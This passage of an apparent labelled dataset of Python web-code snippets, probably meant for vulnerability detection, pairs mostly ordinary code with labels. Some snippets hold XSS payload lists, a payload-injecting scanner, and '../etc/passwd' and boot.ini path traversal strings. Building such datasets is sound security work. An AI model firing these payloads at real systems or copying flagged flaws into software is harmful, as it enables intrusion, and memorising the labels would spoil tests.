ValidationError(_('This VAT ID is not valid. Please re-check your input.')) except vat_moss.errors.WebServiceUnavailableError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country", "label": 0}, {"snippet_id": 33802, "code": " \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents", "label": 1}, {"snippet_id": 55118, "code": "\"Forbidden: You don't have permission for batch editing\" ) active_translations=Translation.objects.filter( active=True, locale=locale, entity__in=entities, ) action_function=ACTIONS_FN_MAP[form.cleaned_data", "label": 0}, {"snippet_id": 8411, "code": ".MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url", "label": 0}, {"snippet_id": 53693, "code": ", FileSystemLoader def make_eb_config(application_name, default_region): UTILS_DIR=os.path.dirname(os.path.abspath(__file__)) j2_env=Environment(loader=FileSystemLoader(UTILS_DIR)) return j2_env.get_template", "label": 1}, {"snippet_id": 25491, "code": ".required=self.one_required def clean(self, value) -> dict: value=super().clean(value) if self.one_required and(not value or not any(v for v in value)): raise forms.ValidationError(self.error_messages[", "label": 0}, {"snippet_id": 49488, "code": " SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices ] elif type(self.model_field)==BooleanField: values=[ SmartFilterValue(self.field_name", "label": 0}, {"snippet_id": 44687, "code": " mimetype=\"application/json\") def _get_workflows(user): return[{ 'name': workflow.name, 'owner': workflow.owner.username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in", "label": 0}, {"snippet_id": 43439, "code": " not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self):", "label": 0}, {"snippet_id": 9119, "code": "<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook", "label": 1}, {"snippet_id": 52779, "code": ".user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission", "label": 0}, {"snippet_id": 5130, "code": " def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')", "label": 0}, {"snippet_id": 5233, "code": " def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href", "label": 0}, {"snippet_id": 53187, "code": "=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_coordinator(request, coordinator, mapping) request.info(_('Coordinator submitted.')) return redirect(reverse(", "label": 0}, {"snippet_id": 7393, "code": "', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect", "label": 0}, {"snippet_id": 1417, "code": "'Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print", "label": 0}, {"snippet_id": 2819, "code": "\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1", "label": 0}, {"snippet_id": 20246, "code": " ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print", "label": 0}, {"snippet_id": 20956, "code": ".html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release", "label": 0}, {"snippet_id": 3978, "code": " Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result", "label": 0}, {"snippet_id": 46823, "code": "('content', content) async def save(self, *args, **kwargs): content=kwargs.pop('content', None) if content is not None: await self.set_content(content) return await super().save(*args, **kwargs) @property", "label": 0}, {"snippet_id": 32309, "code": "%s' % args.port print('Listening on %s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory))", "label": 0}, {"snippet_id": 16970, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading", "label": 0}, {"snippet_id": 2511, "code": ",value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, ", "label": 0}, {"snippet_id": 29756, "code": "() \treturn_files=set() \t \tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t \t\tfile.add(files.split('/')[-1]) \tfiles=sorted(file, reverse=True) \tif format=='cfg': \t\tfor file in files: \t\t\tip=file", "label": 0}, {"snippet_id": 7288, "code": "(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), ", "label": 0}, {"snippet_id": 29951, "code": " conf: \t\t\tconf.write(form.getvalue('ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert", "label": 0}, {"snippet_id": 40186, "code": "(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value", "label": 0}, {"snippet_id": 9006, "code": "/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views", "label": 0}, {"snippet_id": 4975, "code": "<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()", "label": 0}, {"snippet_id": 781, "code": "\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param", "label": 0}, {"snippet_id": 49435, "code": "=field.parameter_name self.model_field=field else: self.field_name=field self.model_field=self.model._meta.get_field(self.field_name) self.query_params=query_params self.object_list=object_list def get_title", "label": 0}, {"snippet_id": 33260, "code": " @decorators.require_taskqueue('backend-default') def post(self, host, task_id): swarming.cancel_task(host, task_id) class UnregisterBuilders(webapp2.RequestHandler): \"\"\"Unregisters builders that didn't", "label": 0}, {"snippet_id": 43443, "code": "): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values", "label": 0}, {"snippet_id": 19135, "code": " verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root", "label": 1}, {"snippet_id": 32863, "code": "(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write('<div class=\"Breadcrumbs\">\\n') self.wfile.write('<a class=\"Breadcrumbs", "label": 1}, {"snippet_id": 52069, "code": ", request,{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit", "label": 1}, {"snippet_id": 40312, "code": "\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1", "label": 1}, {"snippet_id": 26558, "code": "../../../etc/passwd%00', '../../../../etc/passwd%00', '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00', '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00', '", "label": 0}, {"snippet_id": 11743, "code": ": 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$',", "label": 0}, {"snippet_id": 33252, "code": " TaskCancelSwarmingTask(webapp2.RequestHandler): \"\"\"Cancels a swarming task.\"\"\" @decorators.require_taskqueue('backend-default') def post(self, host, task_id): swarming.cancel_task(host, task_id) class", "label": 0}, {"snippet_id": 29762, "code": " in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t \t\tfile.add(files.split('/')[-1]) \tfiles=sorted(file, reverse=True) \tif format=='cfg': \t\tfor file in files: \t\t\tip=file.split(\"-\") \t\t\tif serv==ip[0]: \t\t\t", "label": 0}, {"snippet_id": 24862, "code": "'t being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE=", "label": 0}, {"snippet_id": 12067, "code": " name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',", "label": 0}, {"snippet_id": 2750, "code": "?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url", "label": 0}, {"snippet_id": 34641, "code": "._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: ", "label": 0}, {"snippet_id": 40619, "code": " set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname", "label": 0}, {"snippet_id": 13443, "code": " key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED", "label": 0}, {"snippet_id": 7956, "code": "/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name", "label": 0}, {"snippet_id": 22627, "code": " if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 52096, "code": "'oozie-workflow2', **wid) workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow", "label": 0}, {"snippet_id": 514, "code": " import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list", "label": 0}, {"snippet_id": 47562, "code": "=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(profile.rights), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea", "label": 0}, {"snippet_id": 43647, "code": ", fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields", "label": 0}, {"snippet_id": 40809, "code": " cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{", "label": 0}, {"snippet_id": 34137, "code": " display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the", "label": 0}, {"snippet_id": 14240, "code": ".get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth", "label": 0}, {"snippet_id": 24111, "code": " the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite", "label": 0}, {"snippet_id": 45191, "code": "'properties']['workflow'], workflows): raise PopupException(_('You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json':", "label": 1}, {"snippet_id": 26769, "code": "/boot.ini%00', '../../../../../../../../boot.ini%00', '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 20036, "code": " else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self)", "label": 0}, {"snippet_id": 30798, "code": " Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('/show_compare_configs.html') \tleft=form.getvalue('left') \tright=form.getvalue('right')", "label": 1}, {"snippet_id": 38824, "code": " BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse", "label": 0}, {"snippet_id": 25548, "code": " admission tickets, if the corresponding setting is enabled, as well as additional questions defined by the organizer. \"\"\" def __init__(self, *args, **kwargs): \"\"\" Takes two additional keyword arguments", "label": 0}, {"snippet_id": 20454, "code": "\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format", "label": 0}, {"snippet_id": 27304, "code": "\"\" from builtins import object from future import standard_library standard_library.install_aliases() import base64 import cgi import datetime import json import logging import os import re import sys import", "label": 0}, {"snippet_id": 22223, "code": "), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user',", "label": 0}, {"snippet_id": 34255, "code": " \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta", "label": 0}, {"snippet_id": 15277, "code": " set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self)", "label": 0}, {"snippet_id": 30739, "code": " cmd, save_command] \telse: \t\tcommand=[ cmd] \t\t \tif enable !=\"show\": \t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=", "label": 0}, {"snippet_id": 17738, "code": "', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done", "label": 0}, {"snippet_id": 37432, "code": "\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes", "label": 0}, {"snippet_id": 17725, "code": ".begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name=", "label": 0}, {"snippet_id": 33137, "code": " user README_MD=( 'https://chromium.googlesource.com/infra/infra/+/master/' 'appengine/cr-buildbucket/README.md' ) class MainHandler(webapp2.RequestHandler): \"\"\"Redirects to README.md.\"\"\" def get(self)", "label": 0}, {"snippet_id": 54991, "code": "=locale) ) ChangedEntityLocale.objects.bulk_create(changed_entities_array) def update_translation_memory(changed_translation_pks, project, locale): \"\"\"Update translation memory for a list of translations.", "label": 0}, {"snippet_id": 39078, "code": ").strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str", "label": 0}, {"snippet_id": 16310, "code": ", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 34911, "code": "\t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self", "label": 0}, {"snippet_id": 23160, "code": "\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 25430, "code": "=PERSON_NAME_SCHEMES.get(self.scheme_name) self.one_required=kwargs.get('required', True) require_all_fields=kwargs.pop('require_all_fields', False) kwargs['required']=False kwargs['widget']=(kwargs.get", "label": 0}, {"snippet_id": 49321, "code": "'admin_order_field', False): self.order_field=getattr(field, 'admin_order_field') if callable(field) and getattr(field, 'alters_data', False): raise SmartListException(\"Cannot use a function that alters data", "label": 0}, {"snippet_id": 41702, "code": "\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property ", "label": 0}, {"snippet_id": 43693, "code": "\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true", "label": 0}, {"snippet_id": 37860, "code": "\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self)", "label": 0}, {"snippet_id": 31341, "code": ") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_out.html\", mode='inline') ", "label": 0}, {"snippet_id": 35806, "code": "(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict()", "label": 0}, {"snippet_id": 45543, "code": " def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid", "label": 0}, {"snippet_id": 4999, "code": "()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert", "label": 0}, {"snippet_id": 32695, "code": "=md.convert(contents).encode('utf-8') try: self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write(md_fragment) self.wfile.write('</div>", "label": 0}, {"snippet_id": 24565, "code": "' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback", "label": 0}, {"snippet_id": 10114, "code": " self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite", "label": 0}, {"snippet_id": 18898, "code": "='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views", "label": 0}, {"snippet_id": 44260, "code": " Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission", "label": 1}, {"snippet_id": 29861, "code": ") is not None and serv is not None: \ttry: \t\tfunct.ssh_command(serv,[\"ls -1t\"]) \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue", "label": 0}, {"snippet_id": 46567, "code": ": raise PopupException(_('POST request required.')) collections=json.loads(request.POST.get('collections')) searcher=DashboardController(request.user) response={ 'result': searcher.delete_collections([collection", "label": 0}, {"snippet_id": 10796, "code": ", DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env", "label": 1}, {"snippet_id": 17230, "code": "+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 12702, "code": ".ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin", "label": 0}, {"snippet_id": 10525, "code": " test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call", "label": 0}, {"snippet_id": 22537, "code": " continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' ", "label": 0}, {"snippet_id": 26745, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00', '../../../../../boot.ini%00', '../../../../../../boot.ini%00', '../../../../../../.", "label": 0}, {"snippet_id": 24504, "code": "(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly", "label": 0}, {"snippet_id": 33162, "code": " \"\"\"Updates buckets from configs.\"\"\" @decorators.require_cronjob def get(self): config.cron_update_buckets() class BuildRPCHandler(webapp2.RequestHandler): \"\"\"Redirects to API explorer to see the build", "label": 0}, {"snippet_id": 51224, "code": " 'last_login', 'in_groups') actions=[] @staticmethod def in_groups(obj): value=\"\" for group in obj.groups.all(): value +=group.name return value class GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin)", "label": 0}, {"snippet_id": 26283, "code": "(_('Your VAT ID does not match the selected country.')) try: result=vat_moss.id.validate(data.get('vat_id')) if result: country_code, normalized_id, company_name=result self.instance.vat_id_validated=True", "label": 0}, {"snippet_id": 22794, "code": "<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P", "label": 1}, {"snippet_id": 204, "code": "='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url", "label": 1}, {"snippet_id": 52245, "code": " POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get", "label": 0}, {"snippet_id": 8594, "code": ".views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', ", "label": 0}, {"snippet_id": 49414, "code": " self.value is None: return True return False class SmartFilter(TitleFromModelFieldMixin, object): def __init__(self, model, field, query_params, object_list): self.model=model if isinstance(field, SmartListFilter", "label": 0}, {"snippet_id": 51729, "code": "[ {'name': 'internet_nl_dashboard.account'}, {'name': 'internet_nl_dashboard.urllist'}, {'name': 'internet_nl_dashboard.uploadlog'}, ]}, {'label': _('\ud83d\udd52 Periodic Tasks'), 'items':[ {'name': 'app.job'}, ", "label": 1}, {"snippet_id": 32100, "code": " @staticmethod def action_past(count): return ungettext_lazy( u\"Deleted Mapping\", u\"Deleted Mappings\", count ) policy_rules=((\"identity\", \"identity:delete_mapping\"),) def delete(self, request, obj_id):", "label": 0}, {"snippet_id": 34728, "code": " and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label", "label": 0}, {"snippet_id": 16470, "code": "(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki", "label": 0}, {"snippet_id": 44195, "code": ".django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import", "label": 0}, {"snippet_id": 16151, "code": ".accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views", "label": 0}, {"snippet_id": 24036, "code": " suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"", "label": 0}, {"snippet_id": 48796, "code": " gettext_lazy as _ from typing import List from smart_lists.exceptions import SmartListException from smart_lists.filters import SmartListFilter class TitleFromModelFieldMixin(object): def get_title(self): if", "label": 0}, {"snippet_id": 47175, "code": " Admin, menu from mock import patch from sqlalchemy.exc import SQLAlchemyError from invenio_records.admin import record_adminview from invenio_records.api import Record def test_admin(app, db): \"\"\"Test", "label": 0}, {"snippet_id": 44393, "code": " PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user", "label": 0}, {"snippet_id": 30508, "code": "(local_path_logs, rows, grep_act, grep)]\t \t\t \tfunct.ssh_command(syslog_server, commands, show_log=\"1\") \t if serv is not None and form.getvalue('rows1') is not None: \trows=form.getvalue('rows1') \tgrep=form.getvalue", "label": 0}, {"snippet_id": 17641, "code": " 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$", "label": 0}, {"snippet_id": 33307, "code": ".Route(r'/build/<build_id:\\d+>', ViewBuildHandler), ] 